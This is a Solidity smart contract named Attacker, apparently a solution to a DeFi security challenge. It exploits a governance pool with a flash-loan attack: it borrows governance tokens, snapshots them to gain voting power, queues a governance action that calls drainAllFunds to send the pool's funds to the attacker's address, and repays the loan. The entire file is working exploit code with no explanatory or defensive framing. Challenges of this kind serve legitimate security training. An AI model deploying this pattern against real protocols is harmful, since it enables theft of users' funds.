pragma solidity ^0.8.13;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IPool {
    function flashLoan(uint256) external;
}

interface IGovernance {
    function queueAction(address,bytes calldata,uint256) external;
}

interface IGovernanceToken {
    function snapshot() external;
}

contract Attacker {

    address private pool;
    address private governance;
    address private owner;

    constructor(address poolAddress, address governanceAddress) {
        pool = poolAddress;
        governance = governanceAddress;
        owner = msg.sender;
    }

    function receiveTokens(address token, uint256 amount) external {
        require(msg.sender == pool, "sender must be flash loaner");
        IGovernanceToken(token).snapshot();
        IGovernance(governance).queueAction(
            pool,
            abi.encodeWithSignature("drainAllFunds(address)", owner),
            0
        );
        IERC20(token).transfer(pool, amount);
    }

    function executeFlashLoan(uint256 amount) external {
        require(msg.sender == owner, "Only owner can execute flash loan");
        IPool(pool).flashLoan(amount);
    }
}
